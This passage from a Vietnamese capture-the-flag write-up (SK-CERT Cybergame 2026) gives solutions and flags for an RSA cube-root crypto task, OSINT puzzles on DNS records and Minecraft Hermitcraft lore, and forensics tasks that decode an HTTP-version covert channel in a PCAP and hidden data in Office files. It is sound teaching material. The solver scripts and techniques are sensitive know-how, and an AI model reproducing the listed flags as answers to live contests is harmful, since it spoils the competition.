$$k \cdot n \equiv -c \pmod{p^3}$$
$$k \equiv -c \cdot n^{-1} \pmod{p^3}$$

Như vậy, với mỗi số nguyên tố $p$ trong các mảng, ta có thể tính được một giá trị $k \pmod{p^3}$.

#### 2. Chiến thuật Tấn công (Exploit)

Chúng ta có 3 tập hợp các số nguyên tố. Bằng cách duyệt qua các tổ hợp của $(p_s, p_m, p_b)$, ta thiết lập được một hệ phương trình đồng dư:
$$k \equiv r_s \pmod{p_s^3}$$
$$k \equiv r_m \pmod{p_m^3}$$
$$k \equiv r_b \pmod{p_b^3}$$

Sử dụng **Định lý phần dư Trung Hoa (Chinese Remainder Theorem - CRT)**, ta có thể kết hợp 3 phương trình này để tìm ra $k$ modulo $M = p_s^3 \cdot p_m^3 \cdot p_b^3$. 

Vì modulo tổng hợp $M$ đủ lớn so với giá trị thực tế của $k$, kết quả $k$ thu được từ CRT chính là giá trị $k$ cần tìm (hoặc chỉ lệch một vài bội số của $M$). Có được $k$, ta tính $m = \sqrt[3]{c + k \cdot n}$ và giải mã flag.

#### 3. Solution Script

```python
import gmpy2
from Crypto.Util.number import long_to_bytes

# Dữ liệu từ file output.txt
c = 11734104621330122306051619458715549004966317444961687995511160662947540811139016172479786084339259250279133231484381252142572455923343441751909630006132634029551489956942278382797498244055166471670128996856518381928842972347156560863686418916083864033481250591063552682189700701642321082374834368254671
n = 77568798730065799432351396345551612226901205428287848997625975245113641493265848893286902516448430900148338393806704265615308335340205339876413650967390590557449703078900802918577489564020403891166774121888943505500213272896573003841536554648722172519028834575573537070337576785183121093654306011906187
e = 3

# 3 mảng từ main.py
smallClass = [509, 503, 499, 491, 491, 487, 487, 479, 457, 457, 439, 439, 433, 431, 421, 421, 419, 409, 401, 401, 397, 397, 389, 383, 379, 373, 373, 373, 359, 359, 353, 353, 337, 337, 337, 317, 313, 311, 293, 283, 283, 281, 277, 277, 277, 271, 271, 263, 257, 257, 251, 241, 241, 227, 197, 197, 197, 191, 181, 181, 167, 167, 163, 163, 163, 157, 151, 149, 139, 139, 137, 131, 131, 113, 113, 107, 103, 97, 89, 71, 67, 67, 67, 59, 59, 53, 53, 43, 41, 37, 19, 19, 17, 17, 13, 11, 5, 5, 3, 2]
middleClass = [8161, 8039, 7937, 7699, 7639, 7589, 7517, 7333, 7331, 7331, 7229, 7013, 6841, 6719, 6659, 6577, 6571, 6481, 6469, 6343, 6299, 6263, 6229, 6197, 6007, 5857, 5851, 5639, 5591, 5501, 5347, 5309, 5297, 5167, 4993, 4987, 4909, 4903, 4903, 4787, 4657, 4637, 4597, 4463, 4447, 4363, 4363, 4231, 4129, 4099, 4073, 3881, 3847, 3767, 3643, 3613, 3539, 3527, 3491, 3323, 3257, 3191, 3169, 3037, 2837, 2803, 2731, 2719, 2693, 2557, 2549, 2389, 2357, 2011, 1847, 1789, 1667, 1619, 1303, 1129, 1049, 1039, 1021, 823, 761, 757, 751, 743, 701, 653, 653, 593, 277, 191, 139, 37, 31, 23, 23, 11]
bigClass = [33714707561, 33475189963, 33180798359, 32968219657, 32753993861, 32601998993, 32354000431, 31622210959, 31463103443, 31106171297, 31026644791, 30864000457, 30555832451, 30007127383, 29679425119, 29092782221, 28965030907, 28962105283, 28788132787, 28512646711, 28435367731, 28366379219, 28323441217, 28021435769, 27943699733, 26635017737, 26567935297, 26303239091, 25608036371, 25576881097, 25395389471, 25205052833, 24596525977, 24335124727, 24229533397, 24190929817, 23954685889, 23775654349, 23675939747, 23598824653, 23309496157, 22135955827, 21806963513, 21700899733, 21143839061, 20917551449, 20816352043, 20261287681, 20012201381, 19915512101, 19661235553, 19585405291, 19129191649, 18809753401, 18624918629, 18158829257, 18121590569, 17572665139, 16580964929, 16057692181, 15575058607, 15272351359, 14981230513, 14043779501, 13980148361, 12851947057, 12851592671, 12562954097, 12175890931, 11505311681, 11145919879, 11069320079, 10463008123, 10215147653, 9627859369, 9624045577, 9331874807, 9226461847, 8995683889, 8703841693, 7452307061, 7307945837, 6893239153, 6637300469, 6545235847, 5079964343, 4959254497, 4849767947, 3524654227, 3458365789, 3288001447, 3283570987, 2668164817, 2654685647, 2577719497, 1242720113, 891228883, 601919111, 437723521, 234630371]

def solve():
    # Helper CRT cho 2 phương trình modulo
    def crt_2(r1, m1, r2, m2):
        inv = pow(m1, -1, m2)
        x = (r2 - r1) * inv % m2
        return r1 + x * m1

    # Tính trước phần dư k mod p^3 cho từng mảng để tránh tính lại nhiều lần
    k_small = [((-c * pow(n, -1, p**3)) % (p**3), p**3, p) for p in smallClass]
    k_middle = [((-c * pow(n, -1, p**3)) % (p**3), p**3, p) for p in middleClass]
    k_big = [((-c * pow(n, -1, p**3)) % (p**3), p**3, p) for p in bigClass]

    print("Đang duyệt qua các tổ hợp và tính toán CRT... Sẽ mất một vài giây.")

    for ks, ps3, ps in k_small:
        for km, pm3, pm in k_middle:
            # Gộp small và middle lại
            k_sm = crt_2(ks, ps3, km, pm3)
            m_sm = ps3 * pm3

            for kb, pb3, pb in k_big:
                # Gộp cả 3 lại để ra k
                k_crt = crt_2(k_sm, m_sm, kb, pb3)
                m_full = m_sm * pb3

                # Check thêm vài bội số của M đề phòng k thực tế lớn hơn Modulo kết hợp (M)
                for i in range(20):
                    test_k = k_crt + i * m_full
                    val = c + test_k * n

                    # Kiểm tra xem c + k*n có phải là lập phương hoàn hảo không
                    m_val, is_cube = gmpy2.iroot(val, 3)
                    if is_cube:
                        flag = long_to_bytes(m_val)
                        if b"SK-CERT{" in flag:
                            print("\n[+] THÀNH CÔNG!")
                            print(f"Các nhân tử đã bị rò rỉ: p_s = {ps}, p_m = {pm}, p_b = {pb}")
                            print(f"Flag: {flag.decode(errors='ignore')}")
                            return

solve()
```

```bash
[+] THÀNH CÔNG!
Các nhân tử đã bị rò rỉ: p_s = 479, p_m = 5501, p_b = 24190929817
Flag: SK-CERT{l34k3d_57ruc7ur3_g1v35_6w6y_7h3_50lu710n}
```

> Flag: `SK-CERT{l34k3d_57ruc7ur3_g1v35_6w6y_7h3_50lu710n}`
{: .prompt-flag }

## **OSINT**

### **Osint Sanity Check - Flag is in the description**

- Mô tả: 

Flag is SK-CERT{pl34s3_y0u_c4n_d0_7his}.

- Attachment: 
- Cách giải: Nhập Flag thôi

### **Osint Sanity Check - Plain TXT**

- Mô tả: 

Check out DNS records for `sanity.cybergame.sk`

- Attachment: 
- Cách giải: 

#### 1. Phân tích đề bài

* Tên thử thách là **"Plain TXT"**, đây là một gợi ý trực tiếp (hint) chỉ điểm rằng chúng ta cần tập trung vào loại bản ghi **TXT (Text Record)** của hệ thống phân giải tên miền (DNS).
* Trong thực tế, bản ghi TXT thường chứa các thông tin dạng văn bản thuần túy dùng để xác thực tên miền (SPF, DKIM...), nên trong các giải CTF, nó là nơi phổ biến để giấu cờ.

#### 2. Thực hiện

Sử dụng môi trường dòng lệnh (trong bài là Kali Linux), chúng ta dùng công cụ `nslookup` để truy vấn cấu hình DNS của tên miền mục tiêu.

**Câu lệnh:**

```bash
nslookup -type=TXT sanity.cybergame.sk
```

**Giải thích:**

* `nslookup`: Tiện ích truy vấn máy chủ DNS.
* `-type=TXT`: Cờ (flag) này lọc kết quả, chỉ yêu cầu máy chủ DNS trả về thông tin của bản ghi TXT.
* `sanity.cybergame.sk`: Tên miền cần kiểm tra.

#### 3. Kết quả

Theo kết quả trả về trên Terminal tại phần `Non-authoritative answer`, máy chủ đã phản hồi một bản ghi TXT chứa chuỗi ký tự được đặt trong dấu ngoặc kép:

```text
sanity.cybergame.sk    text = "SK-CERT{7rivi4l_dns_ch4ll3ng3}"
```

> Flag: `SK-CERT{7rivi4l_dns_ch4ll3ng3}`
{: .prompt-flag }

### **Lore of the world - The beginnings**

- Mô tả: 

I found some remnants of a (now archived), but recent world in the Mythical Block Game. I’d like to learn some lore of this world. I took this screenshot of this scenery. Apparently, some odd moustachioed man finished building this approximately half a year ago. Many people considered this his best build yet. But I don’t care for this build, I care for what began it all, in the same exact world. What’s the name of the starter base of this handsome fella? NOTE: All following challenges in this scenario are related to the same world

Flag format: SK-CERT{name_of_the_starter_base}

- Attachments: `1.png`
- Cách giải:

![](/assets/img/Cybergame2026/Lore of the world - The beginnings.png)

1. **Phân tích hình ảnh và dữ kiện:**
- **Trò chơi:** "Mythical Block Game" chính là **Minecraft**. 
- **Người xây dựng:** "Odd moustachioed man" (người đàn ông kỳ lạ có ria mép) và "handsome fella" là biệt danh/đặc điểm nhận diện nổi tiếng của YouTuber Minecraft đình đám **Mumbo Jumbo**. 
- **Công trình trong ảnh:** Hình ảnh trên chụp lại căn cứ siêu khổng lồ (mega base) của Mumbo Jumbo trong **Hermitcraft Season 10**. Khu vực này là một nhà máy theo phong cách Cyberpunk/Industrial mang tên *"Surplus Mega Corp"*. Nổi bật nhất trên công trình này là một màn hình lớn có khuôn mặt pixel hoạt động bằng hệ thống Redstone phức tạp. Bản thân Mumbo Jumbo và cộng đồng fan đều công nhận đây là công trình đẹp nhất và đỉnh cao nhất của anh từ trước đến nay (anh cũng đặt tiêu đề cho một video là "MY BEST BUILD").
- **Thế giới:** Hermitcraft Season 10 (hiện tại trong bối cảnh câu hỏi là một server đã lưu trữ/kết thúc - "archived, but recent world").

1. **Tìm căn cứ khởi đầu (Starter Base):**
- Câu hỏi yêu cầu tìm tên căn cứ khởi đầu (starter base) của Mumbo Jumbo trong cùng thế giới đó (Hermitcraft Season 10).
- Trong Season 10, Mumbo Jumbo đã xây một căn cứ khởi đầu rất đặc biệt: một căn phòng nhỏ xíu treo lơ lửng dưới vòm đá cùa ngọn núi Magic Mountain. 
- Điểm độc đáo là nó hoàn toàn bịt kín, không hề có cửa ra vào. Để đi vào bên trong, anh chàng phải... tự sát để hồi sinh lại trên chiếc giường đã set điểm spawn bên trong căn phòng đó.
- Mumbo Jumbo đã đặt tên cho căn cứ khởi đầu kỳ quặc này là **Mothball** (Viên băng phiến).

Vậy tên căn cứ khởi đầu của Mumbo Jumbo trong mùa này chính là **Mothball**.

> Flag: `SK-CERT{Mothball}`
{: .prompt-flag }

### **Lore of the world - Bureaucracy**

- Mô tả: 

Apparently, this building is among the most hated, not because of the person, but because of what it stands for. A lot of people had (or rather tried) to fill in some kind of document, but unfortunately, due to a really messy bureaucracy, most of them failed. I want to research this situation a little, but I need to find the document’s name. Can you find it?

Flag format: SK-CERT{name_of_the_document}

- Attachments: `2.png`
- Cách giải:

![](assets/img/Cybergame2026/Lore of the world - Bureaucracy.png)

1. **Phân tích bối cảnh:** 
- **Tòa nhà bị ghét (The hated building):** Tòa nhà được nhắc đến ở đây chính là **Permit Office** (Văn phòng Cấp phép) hay *Department of Hermit Permits (DHP)*.
- **Người đứng sau (The person):** Grian là người đã xây dựng và quản lý văn phòng này. 
- **Hệ thống quan liêu (Messy bureaucracy):** Trong Season 10, để được bán một mặt hàng nào đó, các thành viên (Hermits) phải có "Permit" (Giấy phép). Grian đã cố tình thiết kế Văn phòng Cấp phép này trở thành một "cơn ác mộng" quan liêu, bắt mọi người phải làm những thủ tục rườm rà, vô nghĩa, chờ đợi mòn mỏi (nghe nhạc chờ "Please Hold") để khiến họ nản lòng và từ bỏ việc xin xỏ/thay đổi giấy phép.

1. **Tìm tên của tài liệu (The document's name):**
- Khi GoodTimesWithScar (và một số Hermit khác như PearlescentMoon) đến xin cấp giấy phép mới, Grian đã bắt họ phải điền vào một mẫu đơn chứa đầy những câu hỏi vô nghĩa và kỳ quặc (nổi tiếng nhất là câu hỏi *"Base Blooben Test"*).
- Tên mã của mẫu đơn/tài liệu này là **MJYAAFK06**.
- *(Fun fact: Cái tên này thực chất là một Easter Egg gợi nhớ lại Mùa 6 của Hermitcraft. Nó là viết tắt của bài hát chế nổi tiếng do Grian hát: "**M**umbo **J**umbo **Y**ou **A**re **A**way **F**rom **K**eyboard" - **06** là Season 6)*.

Vậy tên của tài liệu bạn cần tìm là **MJYAAFK06**

> Flag: `SK-CERT{MJYAAFK06}`
{: .prompt-flag }

### **Lore of the world - Good doggie**

- Mô tả: 

Not far away from the previous place, I found a really, really good doggie. It’s just chilling there, left all alone. What could the name of such a good doggie be?

Flag format: SK-CERT{name_of_the_dog}

- Attachments: `4.png`
- Cách giải:

![](assets/img/Cybergame2026/Lore of the world - Good doggie.png)

#### Bước 1: Phân tích hình ảnh và nhận diện vật phẩm (Custom Item)
Từ bức ảnh gợi ý, điểm đáng chú ý nhất không phải là các block vanilla bình thường mà là **ly nước giải khát** đặt trên bàn tre. Đây là một custom item đặc trưng của server Hermitcraft thông qua cơ chế Custom Roleplay Data. 
Lúc đầu, tôi dự đoán nó có thể là item `tea` hoặc `cleo_tea`. Tuy nhiên, khi đối chiếu kỹ model và trích xuất texture từ gói tài nguyên (resource pack) của server, tôi xác định được tên chính xác của texture ly nước này là **`pina_colada`**.

#### Bước 2: Truy vết vị trí và chủ nhân khu vực
Biết được ngữ cảnh là **Hermitcraft Season 10** và có thông tin về ly **Pina Colada** đặt tại một khu vực có bãi biển, rừng nhiệt đới (Jungle) và nhà chòi bằng tre. Thay vì phải vào trực tiếp file world nặng nề để tìm tọa độ, tôi chuyển sang phương pháp OSINT thông thường: tìm kiếm video trên YouTube.

Tôi bắt đầu rà soát các video của các Hermit xây dựng base ở khu vực Jungle/Beach trong Season 10. Dấu vết dẫn thẳng đến kênh YouTube của [Keralis](https://www.youtube.com/@Keralis).

Kiểm tra video có tựa đề **"Hermitcraft 10 \| Ep.14: MINECRAFT JUNGLE BASE!"** của Keralis, ngay tại mốc thời gian đầu video (khoảng 0:58), Keralis đang đứng dưới nước cầm đúng ly nước đó. Phía sau lưng anh ấy là một khung cảnh **trùng khớp 100%** với bức ảnh của thử thách: túp lều tre, ghế nằm, đống lửa và **chú chó đang ngồi**.

![](/assets/img/Cybergame2026/Lore of the world - Good doggie-2.png)  

#### Bước 3: Tìm tên chú chó (Tìm cờ)
Bây giờ tôi đã biết đây là base của Keralis và chú chó này thuộc về anh ấy. Câu hỏi cuối cùng là: "Tên của chú chó này là gì?".

Sử dụng Google với từ khóa đơn giản: `hermitcraft keralis dog name season 10`  

Kết quả tìm kiếm trả về (bao gồm cả AI Overview và các bài đăng trên Reddit r/Hermitcraft) đều xác nhận một thông tin trùng khớp: Chú chó tại căn cứ của Keralis trong Season 10 được đặt tên theo một loại đồ uống, đó chính là **Mojito**.

> Flag: `SK-CERT{Mojito}`
{: .prompt-flag }

### **Lore of the world - Vantage point**

- Mô tả: 

I took a flight around the world to a really nice vantage point. As I flew farther from the ground, I managed to snap this picture and freeze this moment in time forever. What are the exact X, Y, and Z coordinates of the place I took the picture from?

Flag format: SK-CERT{XXX,YYY,-ZZZ}; FLAG DOESN’T USE DECIMALS.

Example: SK-CERT{321,43,-200}

- Attachments: `5.png`
- Cách giải:

![](assets/img/Cybergame2026/Lore of the world - Vantage point.png)

Tôi thử tìm kiếm xem thử liệu có trang web nào có view 3D của map Hermitcraft S10 không thì kết quả là có. Đây là trang web [Hermitcraft Maps by Dinip](https://maps.hermitcraft.dinip.pt/season10/#world_isometric_day_final/0/17/-125/361/62)

![](assets/img/Cybergame2026/Lore of the world - Vantage point-2.png)

Tôi tải map Hermitcraft S10 từ [Hermitcraft.com](https://hermitcraft.com/) về và mở map lên, tìm tới 2 khinh khí cầu và lấy toạ độ

> Flag: `SK-CERT{41,118,299}`
{: .prompt-flag }

> Không ngờ phải tải map về để lấy chính xác toạ độ nhưng mà cũng có ích cho các thử thách sau

### **Lore of the world - Server room**

- Mô tả: 

I found a polaroid of some kind of server room. On the back side of the polaroid, there’s a message saying: "Ebbg cnffjbeq: <rzcyblrr bs gur zbagu>". I heard the servers store data related to my investigation. Something tells me this is the last place I need to find to learn the origin of everything in this world. I need to find this facility, but we have to make sure we know it’s the exact one. To confirm it’s the correct one, I have devised a three-step process. Step 1. Find the Minecraft ID name of the highest man-placed block in the area of this base. For example: minecraft:slime_block Step 2. Find the Y coordinate of the highest man-placed block in the area of this base. Step 3. Find the employee of the month’s name inside the facility.

Flag format: SK-CERT{minecraft:block_id-YYY-employee}

- Attachments: `PART_1.zip`
- Cách giải:

#### Bước 1: Giải mã thông điệp ẩn (Cryptography)
Bức ảnh Polaroid có để lại một dòng chữ ở mặt sau: `"Ebbg cnffjbeq: <rzcyblrr bs gur zbagu>"`.
Nhìn vào cấu trúc từ, đây là một dạng mã hóa thay thế cơ bản. Sử dụng ROT13 (dịch chuyển 13 ký tự trong bảng chữ cái), ta giải mã được thông điệp:
**`"Root password: <employee of the month>"`**

Gợi ý này cho biết trực tiếp **Step 3** yêu cầu chúng ta tìm tên của "Nhân viên xuất sắc nhất tháng" được dán bên trong phòng máy chủ này.

#### Bước 2: Truy tìm vị trí cơ sở (Locating the Base)
Dựa vào gợi ý *"learn the origin of everything in this world"* kết hợp với hình ảnh bản đồ Dynmap/BlueMap được cung cấp, ta xác định được vị trí của cơ sở ngầm này. 

Bản đồ cho thấy một khu vực phủ đầy tuyết (Arctic), có đường băng cất cánh, máy bay, các tòa nhà nghiên cứu và biểu tượng (icon) đầu của Hermit **Keralis**. Đây chính là **Keralis's Arctic Base** trong Hermitcraft Season 10. Đi sâu xuống dưới lòng đất của khu vực này, ta sẽ tìm thấy chính xác căn phòng Server Room y hệt trong ảnh Polaroid.

#### Bước 3: Thu thập 3 mảnh ghép của Flag

-   **Mảnh ghép 3 (Step 3 - Employee of the month):**
    Tiến vào bên trong phòng Server Room, ta rà soát khu vực bàn làm việc và các bảng thông báo. Tại đây, có một tấm biển vinh danh "Employee of the month" (theo như mật mã ROT13 đã chỉ điểm). Tên được ghi trên đó là chủ nhân của căn cứ này: **Keralis**.

-   **Mảnh ghép 1 & 2 (Step 1 & 2 - Block cao nhất và Tọa độ Y):**
    Đề bài yêu cầu tìm *"Highest man-placed block"* (Khối block do người chơi đặt nằm ở vị trí cao nhất) tại khu vực base này. 
    Nhìn từ bản đồ tổng quan của Arctic Base, kiến trúc nhân tạo cao nhất không phải là các tòa nhà, mà chính là **đỉnh của 2 chảo Radar khổng lồ** (Radar dishes).
    
    Bay lên đỉnh chóp của chiếc Radar cao nhất và sử dụng F3 (hoặc soi bằng Spectator mode), ta phát hiện ra block nằm ở điểm cao nhất được dùng làm đèn báo hiệu/ăng-ten chính là một cây đuốc đá đỏ (Redstone Torch).
    Đọc thông số trên màn hình F3 (Targeted Block), ta có được:
    -   Minecraft ID: `minecraft:redstone_torch`
    -   Tọa độ Y (Độ cao): `127`

#### Bước 4: Tổng hợp Flag

Ráp cả 3 thông tin vừa tìm được vào định dạng yêu cầu của đề bài: `SK-CERT{minecraft:<block_id>-<YYY>-<employee>}`

> Flag: `SK-CERT{minecraft:redstone_torch-127-Keralis}`
{: .prompt-flag }

## **Forensics**

### **Forensics Sanity Check - Elephant1**

- Mô tả: 

Here is a picture of an elephant. He is huge, so the flag is probably somewhere behind him.

- Attachment: `elephant.png`
- Cách giải:

Sử dụng [Aperi'Solve](https://aperisolve.com/) và upload hình lên. Sau đó kéo xuống phần **Strings** và lấy flag

> Flag: `SK-CERT{jus7_us3_s7rings}`
{: .prompt-flag }

### **Forensics Sanity Check - Elephant2**

- Mô tả: 

This time, I tried to hide the flag much better. You should try to check the content of the image.

- Attachment: `elephant.png`
- Cách giải:

Sử dụng [Aperi'Solve](https://aperisolve.com/) và upload hình lên. Sau đó kéo xuống phần **Exiftool** và lấy flag được mã hoá Base64 trong mục `User Comment`. 

Sử dụng **Cyberchef** giải mã ra Flag

> Flag: `SK-CERT{jus7_png_us3r_c0mm3n7}`
{: .prompt-flag }

### **SPAN Sniff**

- Mô tả:
  
We received a PCAP capture from a corporate network device after a suspected incident. Help us investigate what happened.

- Attachment: `network.pcap`
- Cách giải:

#### Bước 1 — Phân tích tổng quan PCAP

File PCAP (~16 MB, 7753 packets) được bắt qua **SPAN port** (Switched Port ANalyzer) trên một thiết bị mạng nội bộ. Toàn bộ traffic đều là IPv4/TCP, sử dụng Linux Cooked v2 (SLL2) làm encapsulation.

Nhìn vào bảng phân tích IP conversation, một cặp IP nổi bật ngay lập tức:

| Conversation                         | Packets  | Ghi chú                               |
| ------------------------------------ | -------- | ------------------------------------- |
| `192.168.1.69` ↔ `10.10.10.10`       | **3814** | ~49% toàn bộ traffic — rất bất thường |
| `185.199.108.133` ↔ `192.168.48.134` | 605      | GitHub CDN                            |
| `140.82.121.4` ↔ `192.168.48.134`    | 486      | GitHub                                |
| ...                                  | ...      | ...                                   |

Cặp `192.168.1.69 → 10.10.10.10:8080` chiếm gần một nửa toàn bộ capture, trong khi các conversation còn lại đều là traffic bình thường ra Internet (GitHub, Google, v.v.).

#### Bước 2 — Phân tích traffic đáng ngờ

Lọc traffic giữa hai IP này, ta thấy **296 HTTP requests** theo pattern rất đều:

```html
POST /contact HTTP/1.0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...
Content-Type: application/json

{"user_id": 711090, "session_id": "3f34d8b1...", "action": "submit"}
```

```html
DELETE /style.css HTTP/1.1
Host: 192.168.48.134:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64)...
```

Các trường trong request trông ngẫu nhiên và hợp lý: `user_id` 6 chữ số, `session_id` là hex 64 ký tự, `action` trong tập `{blur, click, focus, hover, scroll, submit, view}`, endpoints là các URL web thông thường (`/dashboard`, `/login`, `/contact`...). Đây là **misdirection** — toàn bộ nội dung payload chỉ là nhiễu ngụy trang.

#### Bước 3 — Xác định covert channel

Sau khi loại trừ lần lượt các trường payload, IP ID, TCP window, ISN, source port gaps... phân tích kỹ **HTTP version** trong request line cho thấy điều bất thường:

- Mỗi request dùng **HTTP/1.0** hoặc **HTTP/1.1** — không có version nào khác.
- Tổng cộng: **149 requests dùng HTTP/1.0** và **147 requests dùng HTTP/1.1** → tỷ lệ gần bằng nhau (đặc trưng của binary data ngẫu nhiên).
- **296 requests** = **296 bits** = **37 bytes** — vừa đủ để chứa một flag.

Đây là kỹ thuật **HTTP version covert channel**:

```text
HTTP/1.0  →  bit 0
HTTP/1.1  →  bit 1
```

Attacker mã hóa từng bit của flag vào lựa chọn HTTP version trong từng request. Nội dung thực sự của request (method, endpoint, JSON body) hoàn toàn không mang thông tin — chỉ để traffic trông "bình thường".

#### Bước 4 — Giải mã flag

Đọc chuỗi HTTP version theo thứ tự thời gian, chuyển thành bitstream, ghép 8 bit thành 1 byte:

```text
HTTP/1.0 HTTP/1.1 HTTP/1.0 HTTP/1.0 HTTP/1.1 HTTP/1.1 HTTP/1.0 HTTP/1.1 ...
   0        1        0        0        1        1        0        1      ...
= 0x53 = 'S'

...tiếp tục 296 bits → 37 bytes...
```

```python
import struct, socket, re

with open('network.pcap', 'rb') as f:
    f.read(24)  # bỏ global header
    packets = []
    while True:
        hdr = f.read(16)
        if len(hdr) < 16: break
        ts_sec, ts_usec, incl_len, orig_len = struct.unpack('<IIII', hdr)
        packets.append((ts_sec, ts_usec, f.read(incl_len)))

http_versions = []
for ts, us, data in packets:
    if len(data) < 40: continue
    proto = struct.unpack('>H', data[0:2])[0]
    if proto != 0x0800: continue
    ip = data[20:]
    src_ip = socket.inet_ntoa(ip[12:16])
    dst_ip = socket.inet_ntoa(ip[16:20])
    if src_ip != '192.168.1.69' or dst_ip != '10.10.10.10': continue
    ihl = (ip[0] & 0xf) * 4
    if ip[9] != 6: continue
    tcp = ip[ihl:]
    dport = struct.unpack('>H', tcp[2:4])[0]
    if dport != 8080: continue
    doff = (tcp[12] >> 4) * 4
    payload = tcp[doff:]
    if not payload: continue
    try:
        text = payload.decode('utf-8', errors='replace')
        for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
            if text.startswith(method + ' '):
                version = text.split('\r\n')[0].split(' ')[2]
                http_versions.append((ts, us, version))
                break
    except: pass

http_versions.sort(key=lambda x: (x[0], x[1]))
bits = ''.join('0' if v == 'HTTP/1.0' else '1' for _, _, v in http_versions)
flag_bytes = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits)-7, 8))
print(flag_bytes.decode('ascii'))
```

Output:

```bash
SK-CERT{h1DD3n_1n_pl41n7eX7_n37Fl0w}
```

> Flag: `SK-CERT{h1DD3n_1n_pl41n7eX7_n37Fl0w}`
{: .prompt-flag }

### **Administrative tasks - Tables**

- Mô tả: 

We got excel sheet with some hidden messages, are you able to extract them? Please read README inside .zip file.

- Attachments: `PART_1.zip`
- Cách giải:

#### Bước 1: Khai phá cấu trúc tệp Excel

Thay vì mở bằng phần mềm Excel thông thường, bản chất của file `.xlsx` là một tệp nén chứa các file XML. Bước đầu tiên là đổi đuôi file thành `.zip` và giải nén để phân tích trực tiếp mã nguồn XML. Điều này giúp qua mặt các cơ chế ẩn giấu (hidden/veryHidden) của Excel trên giao diện người dùng.

#### Bước 2: Tìm Mảnh ghép 1 (MSG\_1)

Kiểm tra file `sharedStrings.xml` (nơi lưu trữ toàn bộ các chuỗi văn bản trong Excel). Tác giả đã chẻ nhỏ thông điệp ra thành nhiều mảnh để tránh bị tìm kiếm dễ dàng bằng công cụ (Ctrl+F).

  * Khi ghép các thẻ `<t>` nằm rải rác lại, ta thu được chuỗi: `HIDDEN_MSG_1_{8f2e8d95}`.
  * **MSG\_1 = `8f2e8d95`**

#### Bước 3: Tìm Mảnh ghép 4 (MSG\_4)

Quét các file metadata và cấu hình, ta tìm thấy thông tin đáng ngờ trong file `person.xml`. Tại thẻ chứa thông tin tác giả "Michael Jackson", mảnh ghép thứ 4 được giấu trực tiếp vào thuộc tính `userId`:

  * `userId="S::Michael.jackson@music.com::443ecc80-a96d-4541-acc2-693b102ee34d::HIDDEN_MSG_4_{83b44f09}"`
  * **MSG\_4 = `83b44f09`**

#### Bước 4: Tìm Mảnh ghép 2 (MSG\_2)

Kiểm tra file `comments1.xml` chứa dữ liệu các bình luận (threaded comments). Mảnh ghép này bị ẩn bằng cách chia nhỏ từng ký tự vào các thẻ `<t>` riêng biệt. Mỗi ký tự bị áp dụng các định dạng font chữ, màu sắc và kích thước khác nhau để che mắt nếu người dùng mở file Excel bình thường.

  * Bóc tách và ghép toàn bộ các thẻ `<t>` lại, ta có chuỗi: `H I D D E N _ M S G _ 2 _ { a a 3 0 c 9 b f }`.
  * **MSG\_2 = `aa30c9bf`**

#### Bước 5: Tìm Mảnh ghép 3 (MSG\_3) - Kỹ thuật tự động hóa bằng Python

Khi phân tích `workbook.xml`, phát hiện một worksheet mang tên `.` bị ép ở trạng thái `veryHidden` (tương ứng với `sheet6.xml`). Bên trong `sheet6.xml` chứa các dòng công thức tính toán lồng nhau cực kỳ phức tạp (dùng hàm `CHAR` và `ROUND`), tham chiếu dữ liệu chéo từ `sheet5.xml`.

Thay vì tính toán thủ công hơn 160 ký tự, một đoạn script Python đã được viết để parse XML và mô phỏng lại logic hàm `ROUND` của Excel, tự động giải mã toàn bộ công thức:

```python
import xml.etree.ElementTree as ET
import re
import decimal

# Đọc dữ liệu từ sheet5.xml (Resultz)
tree5 = ET.parse('sheet5.xml')
ns = {'ns': 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'}
resultz = {c.get('r'): str(c.find('ns:v', ns).text) for c in tree5.findall('.//ns:c', ns) if c.find('ns:v', ns) is not None}

# Hàm mô phỏng ROUND của Excel
def excel_round(number, digits=0):
    return int(decimal.Decimal(str(number)).quantize(decimal.Decimal('1'), rounding=decimal.ROUND_HALF_UP))

env = {'CHAR': chr, 'ROUND': excel_round}

# Parse và tính toán công thức từ sheet6.xml
tree6 = ET.parse('sheet6.xml')
msg = ""
for c in tree6.findall('.//ns:c', ns):
    f = c.find('ns:f', ns)
    if f is not None:
        expr = f.text.replace('Resultz!', '')
        cells = set(re.findall(r'[A-Z]+\d+', expr))
        for cell in cells:
            expr = re.sub(r'\b' + cell + r'\b', resultz.get(cell, '0'), expr)
        try:
            msg += eval(expr, {"__builtins__": {}}, env)
        except:
            pass
print(msg)
```

Điều bất ngờ là kết quả đầu ra không phải chuỗi flag ngay lập tức, mà là một đoạn mã VBA:

```vba
Sub Run()
    Dim a As String
    Dim b As String
    a = "}6a0184c0{_3_GSM_"
    b = "NEDDIH"
    a = a & b
    If Len(a) > 0 Then
        MsgBox StrReverse(a)
    End If
End Sub
```

Đoạn VBA này thực hiện việc ghép chuỗi và đảo ngược. Đảo ngược chuỗi `}6a0184c0{_3_GSM_NEDDIH`, ta thu được: `HIDDEN_MSG_3_{0c4810a6}`.

  * **MSG\_3 = `0c4810a6`**

#### Bước 6: Ghép Password và lấy Flag

Dựa vào gợi ý từ file `README1.txt`, thứ tự ghép các mảnh là **`1 4 2 3`**:
`FLAG_PASSWORD` = `8f2e8d95` + `83b44f09` + `aa30c9bf` + `0c4810a6`

Sử dụng mật khẩu **`8f2e8d9583b44f09aa30c9bf0c4810a6`** để giải nén `flag1.zip`, ta nhận được flag cuối cùng:

> Flag: `SK-CERT{L057_1N_3XC3L_5H3375}`
{: .prompt-flag }


### **Administrative tasks - Paragraphs**

- Mô tả: 

We like Office documents, so what about this Base64 guide document ? Is something hidden here ? Please read README inside .zip file.

- Attachments: `PART_2.zip`
- Cách giải:

#### Bước 1: Khai phá cấu trúc tệp Word (DOCX)
Tương tự như Excel, file `.docx` thực chất là một kho lưu trữ dạng nén (ZIP) chứa các tệp XML, hình ảnh và metadata. Đổi đuôi file từ `.docx` sang `.zip` và tiến hành giải nén để có thể rà soát toàn bộ mã nguồn bên trong thay vì chỉ nhìn bề nổi trên giao diện phần mềm Word.

#### Bước 2: Tìm Mảnh ghép 2 (MSG_2) - document.xml
Phần nội dung chính của tài liệu Word được lưu trong `word/document.xml`. Khi tìm kiếm với từ khóa `HIDDEN`, ta nhanh chóng phát hiện ra mảnh ghép thứ 2 bị ẩn trong văn bản.
